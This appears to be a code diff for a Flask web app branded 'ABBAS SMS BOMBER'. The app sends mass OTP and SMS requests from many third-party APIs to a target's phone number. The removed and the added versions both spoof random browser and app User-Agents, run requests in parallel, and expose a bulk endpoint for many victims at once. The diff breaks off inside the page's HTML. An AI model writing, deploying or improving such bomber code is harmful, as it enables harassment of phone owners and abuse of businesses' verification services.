@@ -1,272 +1,711 @@
-import json
-import asyncio
-import aiohttp
 from flask import Flask, request, jsonify
+import requests
+import concurrent.futures
+import json
+import time
 import random
-from typing import Dict, Any, List
-
-# Import user_agent generator (install via requirements.txt)
-try:
-    from user_agent import generate_user_agent
-except ImportError:
-    generate_user_agent = lambda: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+from datetime import datetime
+import threading
+import os
 
 app = Flask(__name__)
 
-DEFAULT_CC = "91"
-API_JSON_PATH = "api.json"
-MAX_TOTAL_REQUESTS = 500   # safe limit for Vercel (adjust as needed)
+# Load APIs from JSON file
+with open('apis.json', 'r') as f:
+    APIS_DATA = json.load(f)
 
-# ---------- Random User-Agent functions (copied from your script) ----------
-def _dalvik_agent():
-    vr = ["1.6.0", "2.1.0", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.3.0"]
-    an = ["7.0", "7.1", "8.0", "8.1", "9", "10", "11", "12", "13", "14"]
-    dev = ["SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Nexus 6", 
-           "OnePlus 7T", "OnePlus 8", "OnePlus 9", "HUAWEI P30", "HUAWEI P40", "Xiaomi Mi 9", 
-           "Xiaomi Mi 10", "Xiaomi Mi 11", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", 
-           "OPPO Reno2", "OPPO Reno3", "OPPO Reno4", "Vivo V20", "Vivo V21", "Realme 7", "Realme 8",
-           "Sony Xperia 1", "Sony Xperia 5", "LG G8", "LG V50", "Nokia 8.3", "Motorola Edge+"]
-    sos = ["QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011", "RQ1A.210105.003",
-           "RP1A.200720.011", "QKQ1.190910.002", "LMY47V", "MMB29M", "NRD90M", "OPM1.171019.011",
-           "PKQ1.190522.001", "QKQ1.190825.002", "RKQ1.200826.002", "SP1A.210812.016"]
-    nano = random.choice(vr)
-    com = random.choice(an)
-    mod = random.choice(dev)
-    lp = random.choice(sos)
-    return f"Dalvik/{nano} (Linux; U; Android {com}; {mod} Build/{lp})"
+APIS = APIS_DATA["apis"]
 
-def _browser_agent():
-    browsers = ['chrome', 'kiwi', 'brave', 'edge', 'firefox', 'samsung', 'opera', 'yandex', 'ucbrowser']
-    browser = random.choice(browsers)
-    lop = ["9", "10", "11", "12", "13", "14"]
-    sms = ["Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Samsung Galaxy S21", "Samsung Galaxy S22", 
-           "Samsung Galaxy S23", "Samsung Galaxy Note 20", "Samsung Galaxy Note 10", "Samsung Galaxy A52",
-           "Samsung Galaxy A72", "OnePlus 9", "OnePlus 10 Pro", "OnePlus 11", "Xiaomi Mi 11", 
-           "Xiaomi Mi 12", "Xiaomi Redmi Note 11", "Huawei P40", "Huawei P50", "Sony Xperia 1 III", 
-           "Sony Xperia 5 III", "Google Nexus 5", "Google Nexus 6P", "LG G7", "LG V60", 
-           "Motorola Moto G100", "Nokia 5.4", "Oppo Find X3", "Realme GT", "Vivo X60"]
-    ml = random.randint(89, 120)
-    oop = random.randint(537, 545)
-    mmk = random.choice(lop)
-    awq = random.choice(sms)
-    
-    if browser == "chrome":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
-    elif browser == "kiwi":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Kiwi/{ml}.0.0.0 Mobile Safari/{oop}.36"
-    elif browser == "brave":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 Brave/{ml}.0.0.0"
-    elif browser == "edge":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 EdgA/{ml}.0.0.0"
-    elif browser == "firefox":
-        ff_version = random.randint(90, 115)
-        return f"Mozilla/5.0 (Android {mmk}; Mobile; rv:{ff_version}.0) Gecko/{ff_version}.0 Firefox/{ff_version}.0"
-    elif browser == "samsung":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) SamsungBrowser/{random.randint(15, 20)}.0 Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
-    elif browser == "opera":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 OPR/{random.randint(65, 75)}.0.0"
-    elif browser == "yandex":
-        return f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 YaBrowser/{random.randint(20, 23)}.3.0.0 Mobile Safari/{oop}.36"
-    elif browser == "ucbrowser":
-        uc_version = random.randint(12, 13)
-        return f"Mozilla/5.0 (Linux; U; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Version/4.0 Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 UCBrowser/{uc_version}.0.0.0"
-
-def _ios_agent():
-    los = ["14.0", "14.4", "14.8", "15.0", "15.1", "15.2", "15.3", "15.4", "15.5", "15.6", "15.7", 
-           "16.0", "16.1", "16.2", "16.3", "16.4", "16.5", "16.6", "17.0", "17.1", "17.2"]
-    dec = ["iPhone12,1", "iPhone12,3", "iPhone12,5", "iPhone13,1", "iPhone13,2", "iPhone13,3", 
-           "iPhone13,4", "iPhone14,2", "iPhone14,3", "iPhone14,4", "iPhone14,5", "iPhone14,6",
-           "iPhone14,7", "iPhone14,8", "iPhone15,2", "iPhone15,3", "iPhone15,4", "iPhone15,5",
-           "iPad8,1", "iPad8,2", "iPad8,3", "iPad8,4", "iPad8,5", "iPad8,6", "iPad8,7", "iPad8,8",
-           "iPad8,9", "iPad8,10", "iPad8,11", "iPad8,12", "iPad11,1", "iPad11,2", "iPad11,3", 
-           "iPad11,4", "iPad11,6", "iPad11,7", "iPad13,1", "iPad13,2", "iPad13,4", "iPad13,5",
-           "iPad14,1", "iPad14,2"]
-    web = random.randint(600, 615)
-    sf = random.randint(14, 18)
-    nok = random.choice(los)
-    mod = random.choice(dec)
-    return f"Mozilla/5.0 ({'iPhone' if 'iPhone' in mod else 'iPad'}; CPU {mod.replace(',', '')} OS {nok.replace('.', '_')} like Mac OS X) AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"
-
-def _desktop_agent():
-    browsers = ['chrome', 'firefox', 'edge', 'opera', 'safari', 'brave']
-    browser = random.choice(browsers)
-    os_list = ['Windows NT 10.0', 'Windows NT 11.0', 'Macintosh; Intel Mac OS X 10_15_7', 
-               'Macintosh; Intel Mac OS X 11_0_0', 'Macintosh; Intel Mac OS X 12_0_0',
-               'X11; Linux x86_64', 'X11; Ubuntu; Linux x86_64', 'X11; Fedora; Linux x86_64']
-    os_choice = random.choice(os_list)
-    if browser == "chrome":
-        version = random.randint(90, 120)
-        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36"
-    elif browser == "firefox":
-        version = random.randint(90, 115)
-        return f"Mozilla/5.0 ({os_choice}; rv:{version}.0) Gecko/20100101 Firefox/{version}.0"
-    elif browser == "edge":
-        version = random.randint(90, 120)
-        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Edg/{version}.0.0.0"
-    elif browser == "opera":
-        version = random.randint(75, 90)
-        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 OPR/{version}.0.0.0"
-    elif browser == "safari":
-        version = random.randint(14, 17)
-        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Safari/605.1.15"
-    elif browser == "brave":
-        version = random.randint(90, 120)
-        return f"Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Brave/{version}.0.0.0"
-
-def _mobile_app_agent():
-    apps = ['Telegram', 'WhatsApp', 'Instagram', 'Facebook', 'Twitter', 'Discord', 'Signal']
-    app = random.choice(apps)
-    if app == "Telegram":
-        versions = ["9.0", "9.1", "9.2", "9.3", "9.4", "9.5", "10.0", "10.1", "10.2"]
-        return f"Telegram/{random.choice(versions)} (Android {random.choice(['9', '10', '11', '12', '13'])}; SDK {random.randint(28, 33)})"
-    elif app == "WhatsApp":
-        versions = ["2.23", "2.24", "2.25", "2.26", "2.27"]
-        return f"WhatsApp/{random.choice(versions)}.{random.randint(1, 99)} Android/{random.randint(9, 13)}"
-    elif app == "Instagram":
-        versions = ["270.0", "271.0", "272.0", "273.0", "274.0", "275.0"]
-        return f"Instagram {random.choice(versions)}.{random.randint(10, 99)} Android ({random.randint(28, 33)}/{random.randint(9, 13)}; {random.choice(['320dpi', '420dpi', '480dpi', '560dpi'])})"
-    else:
-        return generate_user_agent()
-
-def _get_random_agent():
-    agent_types = [_ios_agent, _browser_agent, _dalvik_agent, _desktop_agent, _mobile_app_agent, generate_user_agent]
-    weights = [0.2, 0.3, 0.2, 0.1, 0.1, 0.1]
-    chosen_agent = random.choices(agent_types, weights=weights, k=1)[0]
-    try:
-        return chosen_agent() if chosen_agent != generate_user_agent else generate_user_agent()
-    except:
-        return generate_user_agent()
-
-def get_dynamic_headers(agent: str) -> dict:
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Encoding': 'gzip, deflate, br, zstd',
-        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-IN,en;q=0.8,hi;q=0.6', 'hi-IN,en;q=0.7']),
-        'Connection': 'keep-alive',
-        'X-Requested-With': 'XMLHttpRequest',
-        'Sec-Fetch-Site': 'cross-site',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Dest': 'empty',
+def send_single_request(api_config, phone_number):
+    """Send request to single API"""
+    result = {
+        "name": api_config["name"],
+        "status": "pending",
+        "message": "",
+        "response_code": None,
+        "time_taken": None
     }
-    is_mobile = any(key in agent for key in ['Android', 'iPhone', 'iPad', 'Mobile', 'Dalvik', 'WhatsApp', 'Telegram', 'Instagram'])
-    if is_mobile:
-        headers.update({
-            'Sec-Ch-Ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
-            'Sec-Ch-Ua-Mobile': '?1',
-            'Sec-Ch-Ua-Platform': '"Android"' if 'Android' in agent else '"iOS"',
-        })
-    else:
-        headers.update({
-            'Sec-Ch-Ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-            'Sec-Ch-Ua-Mobile': '?0',
-            'Sec-Ch-Ua-Platform': '"Windows"' if 'Windows' in agent else '"macOS"' if 'Mac' in agent else '"Linux"',
-        })
-    return headers
-# ---------- End of UA functions ----------
-
-def load_apis() -> List[Dict[str, Any]]:
+    
     try:
-        with open(API_JSON_PATH, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    except Exception as e:
-        print(f"Error loading APIs: {e}")
-        return []
-
-def interpolate_string(s: str, phone: str, cc: str) -> str:
-    s = s.replace("{no}", phone).replace("{cc}", cc)
-    return s
-
-def interpolate_body(body: Any, phone: str, cc: str) -> Any:
-    if isinstance(body, dict):
-        return {k: interpolate_body(v, phone, cc) for k, v in body.items()}
-    elif isinstance(body, str):
-        return interpolate_string(body, phone, cc)
-    elif isinstance(body, list):
-        return [interpolate_body(item, phone, cc) for item in body]
-    else:
-        return body
-
-async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any], phone: str, cc: str):
-    name = api.get("name", "Unnamed")
-    url = interpolate_string(api["url"], phone, cc)
-    method = api.get("method", "POST").upper()
-    headers = api.get("headers", {}).copy()
-    # Add random UA and dynamic headers
-    ua = _get_random_agent()
-    dyn_headers = get_dynamic_headers(ua)
-    dyn_headers['User-Agent'] = ua
-    for k, v in dyn_headers.items():
-        if k not in headers and k.lower() not in [h.lower() for h in headers]:
-            headers[k] = v
-    body_data = api.get("body")
-    json_data = None
-    form_data = None
-    if body_data is not None:
-        interpolated = interpolate_body(body_data, phone, cc)
-        content_type = headers.get("Content-Type", "")
-        if "application/json" in content_type:
-            json_data = interpolated
+        start_time = time.time()
+        
+        # Prepare URL
+        url = api_config["url"].replace("{phone}", phone_number)
+        
+        # Prepare headers
+        headers = api_config.get("headers", {})
+        
+        # Add random User-Agent if not present
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        ]
+        
+        if "User-Agent" not in headers:
+            headers["User-Agent"] = random.choice(user_agents)
+        
+        # Prepare data
+        data = None
+        if api_config.get("data"):
+            data_str = api_config["data"].replace("{phone}", phone_number)
+            
+            if api_config.get("headers", {}).get("Content-Type", "").startswith("application/json"):
+                try:
+                    data = json.loads(data_str)
+                except:
+                    data = data_str
+            else:
+                data = data_str
+        
+        # Send request
+        timeout = random.randint(8, 12)
+        
+        if api_config["method"] == "GET":
+            response = requests.get(url, headers=headers, timeout=timeout)
         else:
-            form_data = interpolated if isinstance(interpolated, dict) else interpolated
-    try:
-        async with session.request(method, url, headers=headers, json=json_data, data=form_data, timeout=15) as resp:
-            status = resp.status
-            text = await resp.text()
-            preview = text[:100].replace('\n', ' ')
-            print(f"[{status}] {name} -> {preview}")
-            return status, text
+            if isinstance(data, dict):
+                response = requests.post(url, json=data, headers=headers, timeout=timeout)
+            else:
+                response = requests.post(url, data=data, headers=headers, timeout=timeout)
+        
+        end_time = time.time()
+        
+        # Update result
+        result["status"] = "success" if response.status_code in [200, 201, 202] else "failed"
+        result["response_code"] = response.status_code
+        result["time_taken"] = round(end_time - start_time, 2)
+        result["message"] = response.text[:200] if response.text else "No response"
+                
+    except requests.exceptions.Timeout:
+        result["status"] = "timeout"
+        result["message"] = "Request timeout after 10 seconds"
+    except requests.exceptions.ConnectionError:
+        result["status"] = "connection_error"
+        result["message"] = "Connection failed"
+    except requests.exceptions.RequestException as e:
+        result["status"] = "error"
+        result["message"] = str(e)
     except Exception as e:
-        print(f"[ERROR] {name} -> {str(e)}")
-        return None, str(e)
+        result["status"] = "error"
+        result["message"] = f"Unknown error: {str(e)}"
+    
+    return result
 
-async def run_bomber(apis: List[Dict], phone: str, cc: str, amount: int):
-    total = len(apis) * amount
-    if total > MAX_TOTAL_REQUESTS:
-        # limit to avoid timeout
-        factor = MAX_TOTAL_REQUESTS // len(apis)
-        amount = factor if factor > 0 else 1
-        print(f"Total requests {total} exceeds limit {MAX_TOTAL_REQUESTS}. Reducing amount to {amount}.")
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(amount):
-            for api in apis:
-                tasks.append(send_request(session, api, phone, cc))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-    return results
-
-@app.route('/send', methods=['GET'])
-def send_otp():
-    phone = request.args.get('phone')
-    if not phone or not phone.isdigit():
-        return jsonify({"error": "Missing or invalid 'phone' (digits only)"}), 400
-    amount_str = request.args.get('amount', '1')
-    if not amount_str.isdigit() or int(amount_str) < 1:
-        return jsonify({"error": "Amount must be a positive integer"}), 400
-    amount = int(amount_str)
-    cc = request.args.get('cc', DEFAULT_CC)
-    if not cc.isdigit():
-        return jsonify({"error": "Country code must be digits"}), 400
-    apis = load_apis()
-    if not apis:
-        return jsonify({"error": "No APIs loaded"}), 500
-    total_expected = len(apis) * amount
-    # Run the bomber synchronously (blocking) to ensure completion
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+@app.route('/api', methods=['GET'])
+def api_endpoint():
+    """Main API endpoint - Send SMS requests (Minimal response only)"""
+    phone_number = request.args.get('num')
+    
+    if not phone_number:
+        return jsonify({
+            "status": "error",
+            "message": "Phone number is required. Use /api?num=XXXXXXXXXX",
+            "example": "https://ab-bomb-api.vercel.app/api?num=1234567890"
+        }), 400
+    
+    # Validate phone number
+    if not phone_number.isdigit() or len(phone_number) != 10:
+        return jsonify({
+            "status": "error",
+            "message": "Invalid phone number. Please provide 10-digit Indian number"
+        }), 400
+    
     try:
-        results = loop.run_until_complete(run_bomber(apis, phone, cc, amount))
-    finally:
-        loop.close()
-    success = sum(1 for r in results if r is not None and isinstance(r, tuple) and r[0] in (200, 201, 202, 204))
+        start_time = time.time()
+        successful = 0
+        failed = 0
+        
+        # Get max workers parameter
+        max_workers = int(request.args.get('workers', 10))
+        
+        # Send requests in parallel
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = [executor.submit(send_single_request, api, phone_number) for api in APIS]
+            
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result["status"] == "success":
+                        successful += 1
+                    else:
+                        failed += 1
+                except Exception:
+                    failed += 1
+        
+        end_time = time.time()
+        total_time = round(end_time - start_time, 2)
+        
+        response_data = {
+            "status": "completed",
+            "successful": successful,
+            "failed": failed,
+            "timestamp": datetime.now().isoformat(),
+            "total_requests": len(APIS),
+            "total_time_seconds": total_time
+        }
+        
+        return jsonify(response_data)
+        
+    except Exception as e:
+        return jsonify({
+            "status": "error",
+            "message": f"Server error: {str(e)}"
+        }), 500
+
+@app.route('/api/test', methods=['GET'])
+def test_single():
+    """Test single API"""
+    phone_number = request.args.get('num')
+    api_name = request.args.get('api')
+    
+    if not phone_number or not api_name:
+        return jsonify({
+            "status": "error",
+            "message": "Both 'num' and 'api' parameters are required"
+        }), 400
+    
+    # Find API
+    api_config = None
+    for api in APIS:
+        if api["name"].lower() == api_name.lower():
+            api_config = api
+            break
+    
+    if not api_config:
+        return jsonify({
+            "status": "error",
+            "message": f"API '{api_name}' not found"
+        }), 404
+    
+    # Send request
+    result = send_single_request(api_config, phone_number)
+    
     return jsonify({
         "status": "completed",
-        "total_sent": total_expected,
-        "success_count": success,
-        "message": f"Sent {amount} request(s) per API to +{cc}{phone}"
-    }), 200
+        "phone_number": phone_number,
+        "api": api_name,
+        "result": result
+    })
 
-# Vercel requires the app to be named `app`
-app = app
+@app.route('/api/bulk', methods=['POST'])
+def bulk_requests():
+    """Bulk requests with custom configuration (Minimal response)"""
+    try:
+        data = request.json
+        
+        if not data:
+            return jsonify({
+                "status": "error",
+                "message": "JSON data is required"
+            }), 400
+        
+        phone_numbers = data.get("phone_numbers", [])
+        selected_apis = data.get("apis", "all")
+        delay = data.get("delay", 2)
+        max_workers = data.get("workers", 5)
+        
+        if not phone_numbers:
+            return jsonify({
+                "status": "error",
+                "message": "phone_numbers array is required"
+            }), 400
+        
+        # Filter APIs
+        if selected_apis != "all":
+            apis_to_use = [api for api in APIS if api["name"] in selected_apis]
+        else:
+            apis_to_use = APIS
+        
+        overall_stats = {
+            "total_numbers": len(phone_numbers),
+            "total_requests": len(apis_to_use) * len(phone_numbers),
+            "completed": 0,
+            "successful": 0,
+            "failed": 0
+        }
+        
+        for idx, phone in enumerate(phone_numbers):
+            if idx > 0:
+                time.sleep(delay)
+            
+            phone_successful = 0
+            phone_failed = 0
+            
+            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+                futures = [executor.submit(send_single_request, api, phone) for api in apis_to_use]
+                
+                for future in concurrent.futures.as_completed(futures):
+                    try:
+                        result = future.result()
+                        if result["status"] == "success":
+                            phone_successful += 1
+                            overall_stats["successful"] += 1
+                        else:
+                            phone_failed += 1
+                            overall_stats["failed"] += 1
+                    except Exception:
+                        phone_failed += 1
+                        overall_stats["failed"] += 1
+            
+            overall_stats["completed"] += 1
+        
+        return jsonify({
+            "status": "completed",
+            "overall_stats": overall_stats,
+            "timestamp": datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        return jsonify({
+            "status": "error",
+            "message": f"Error processing bulk request: {str(e)}"
+        }), 500
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+@app.route('/api/ping', methods=['GET'])
+def ping():
+    """Check if API is alive"""
+    return jsonify({
+        "status": "alive",
+        "timestamp": datetime.now().isoformat(),
+        "version": "1.0.0",
+        "total_apis": len(APIS)
+    })
+
+@app.route('/')
+def home():
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>SMS BOMBER</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            :root {
+                --primary: linear-gradient(135deg, #8B0000 0%, #2F0000 100%);
+                --secondary: linear-gradient(135deg, #B22222 0%, #8B0000 100%);
+                --accent: linear-gradient(135deg, #FF2400 0%, #8B0000 100%);
+                --glass: rgba(0, 0, 0, 0.3);
+                --glass-border: rgba(255, 0, 0, 0.2);
+                --shadow: 0 8px 32px rgba(139, 0, 0, 0.5);
+            }
+            
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+                background: var(--primary);
+                min-height: 100vh;
+                overflow-x: hidden;
+                color: #fff;
+            }
+            
+            body::before {
+                content: '';
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: 
+                    radial-gradient(circle at 20% 80%, rgba(255, 0, 0, 0.2) 0%, transparent 50%),
+                    radial-gradient(circle at 80% 20%, rgba(178, 34, 34, 0.2) 0%, transparent 50%),
+                    radial-gradient(circle at 40% 40%, rgba(139, 0, 0, 0.2) 0%, transparent 50%);
+                z-index: -1;
+            }
+            
+            .container {
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 20px;
+                position: relative;
+                z-index: 1;
+            }
+            
+            .header {
+                text-align: center;
+                margin-bottom: 40px;
+                padding: 40px 20px;
+                background: var(--glass);
+                backdrop-filter: blur(20px);
+                border-radius: 24px;
+                border: 1px solid var(--glass-border);
+                box-shadow: var(--shadow);
+                border: 2px solid rgba(255, 0, 0, 0.3);
+            }
+            
+            .header h1 {
+                background: linear-gradient(45deg, #FF2400, #FF0000, #DC143C);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                font-size: clamp(2rem, 5vw, 3.5rem);
+                font-weight: 900;
+                margin-bottom: 12px;
+                letter-spacing: -0.02em;
+                text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            }
+            
+            .header p {
+                color: #FFB6C1;
+                font-size: 1.2rem;
+                font-weight: 400;
+                max-width: 600px;
+                margin: 0 auto;
+                line-height: 1.6;
+            }
+            
+            .api-count {
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                background: var(--secondary);
+                padding: 12px 24px;
+                border-radius: 50px;
+                margin-top: 20px;
+                font-weight: 900;
+                color: #FFD700;
+                box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5);
+                border: 2px solid rgba(255, 0, 0, 0.5);
+                text-transform: uppercase;
+                letter-spacing: 1px;
+                animation: pulse 2s infinite;
+            }
+            
+            @keyframes pulse {
+                0% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5); }
+                50% { box-shadow: 0 4px 40px rgba(255, 0, 0, 0.8); }
+                100% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5); }
+            }
+            
+            .endpoints-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+                gap: 24px;
+                margin: 40px 0;
+            }
+            
+            .endpoint-card {
+                background: var(--glass);
+                backdrop-filter: blur(20px);
+                border: 1px solid var(--glass-border);
+                border-radius: 20px;
+                padding: 32px;
+                box-shadow: var(--shadow);
+                transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+                position: relative;
+                overflow: hidden;
+                border: 2px solid rgba(255, 0, 0, 0.3);
+            }
+            
+            .endpoint-card::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: 0;
+                right: 0;
+                height: 4px;
+                background: var(--accent);
+            }
+            
+            .endpoint-card:hover {
+                transform: translateY(-12px);
+                box-shadow: 0 20px 40px rgba(255, 0, 0, 0.4);
+                border-color: rgba(255, 0, 0, 0.6);
+            }
+            
+            .endpoint-card h3 {
+                color: #FFB6C1;
+                margin-bottom: 16px;
+                font-size: 1.3rem;
+                font-weight: 700;
+                display: flex;
+                align-items: center;
+                gap: 12px;
+            }
+            
+            .method-badge {
+                padding: 6px 16px;
+                border-radius: 20px;
+                font-size: 0.8rem;
+                font-weight: 700;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                border: 1px solid rgba(255, 255, 255, 0.3);
+            }
+            
+            .method-get { 
+                background: linear-gradient(135deg, #DC143C, #B22222);
+                color: #FFD700;
+            }
+            
+            .method-post { 
+                background: linear-gradient(135deg, #8B0000, #660000);
+                color: #FFD700;
+            }
+            
+            .endpoint-code {
+                background: rgba(0, 0, 0, 0.5);
+                padding: 20px;
+                border-radius: 16px;
+                margin: 20px 0;
+                font-family: 'JetBrains Mono', 'Fira Code', monospace;
+                color: #FF6347;
+                border: 1px solid rgba(255, 0, 0, 0.2);
+                font-size: 0.95rem;
+                line-height: 1.6;
+                position: relative;
+            }
+            
+            .endpoint-card p {
+                color: #FFB6C1;
+                line-height: 1.6;
+                margin-bottom: 8px;
+            }
+            
+            .test-section {
+                background: var(--glass);
+                backdrop-filter: blur(20px);
+                border: 1px solid var(--glass-border);
+                border-radius: 24px;
+                padding: 40px;
+                margin: 40px 0;
+                box-shadow: var(--shadow);
+                text-align: center;
+                border: 2px solid rgba(255, 0, 0, 0.3);
+            }
+            
+            .test-section h2 {
+                background: linear-gradient(45deg, #FF2400, #FF0000);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                font-size: 2rem;
+                margin-bottom: 24px;
+                font-weight: 900;
+                text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            }
+            
+            .test-form {
+                display: flex;
+                gap: 16px;
+                max-width: 500px;
+                margin: 0 auto 24px;
+                flex-wrap: wrap;
+            }
+            
+            .test-input {
+                flex: 1;
+                min-width: 250px;
+                padding: 16px 24px;
+                border: 2px solid rgba(255, 0, 0, 0.3);
+                border-radius: 16px;
+                font-size: 1.1rem;
+                background: rgba(0, 0, 0, 0.5);
+                backdrop-filter: blur(10px);
+                transition: all 0.3s ease;
+                font-family: inherit;
+                color: #fff;
+            }
+            
+            .test-input::placeholder {
+                color: #FFB6C1;
+            }
+            
+            .test-input:focus {
+                outline: none;
+                border-color: #FF0000;
+                box-shadow: 0 0 0 4px rgba(255, 0, 0, 0.2);
+                transform: translateY(-2px);
+                background: rgba(0, 0, 0, 0.7);
+            }
+            
+            .test-button {
+                padding: 16px 32px;
+                background: var(--accent);
+                color: #FFD700;
+                border: none;
+                border-radius: 16px;
+                font-size: 1.1rem;
+                font-weight: 900;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                box-shadow: 0 8px 25px rgba(255, 0, 0, 0.5);
+                text-transform: uppercase;
+                letter-spacing: 1px;
+                border: 2px solid rgba(255, 215, 0, 0.3);
+            }
+            
+            .test-button:hover {
+                transform: translateY(-4px);
+                box-shadow: 0 12px 35px rgba(255, 0, 0, 0.7);
+                background: linear-gradient(135deg, #FF0000, #DC143C);
+            }
+            
+            .test-button:disabled {
+                opacity: 0.6;
+                cursor: not-allowed;
+                transform: none;
+            }
+            
+            .response-box {
+                background: rgba(0, 0, 0, 0.7);
+                border-radius: 16px;
+                padding: 24px;
+                max-height: 400px;
+                overflow-y: auto;
+                border: 1px solid rgba(255, 0, 0, 0.2);
+                box-shadow: inset 0 2px 10px rgba(255, 0, 0, 0.1);
+                text-align: left;
+                margin-top: 20px;
+                color: #FFB6C1;
+            }
+            
+            .success { 
+                color: #32CD32;
+                font-weight: bold;
+                text-shadow: 0 0 10px rgba(50, 205, 50, 0.5);
+            }
+            
+            .error { 
+                color: #FF4500;
+                font-weight: bold;
+                text-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
+            }
+            
+            .loading { 
+                color: #FFD700;
+                font-weight: bold;
+            }
+            
+            .footer {
+                text-align: center;
+                padding: 40px 20px;
+                color: rgba(255, 182, 193, 0.9);
+                font-size: 0.95rem;
+                border-top: 1px solid rgba(255, 0, 0, 0.2);
+                margin-top: 40px;
+            }
+            
+            .warning {
+                color: #FFD700;
+                font-size: 0.9rem;
+                font-style: italic;
+                margin-top: 10px;
+                text-align: center;
+            }
+            
+            @media (max-width: 768px) {
+                .container { padding: 16px; }
+                .endpoints-grid { grid-template-columns: 1fr; }
+                .test-form { flex-direction: column; }
+                .test-input, .test-button { width: 100%; }
+            }
+        </style>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>ABBAS SMS BOMBER</h1>
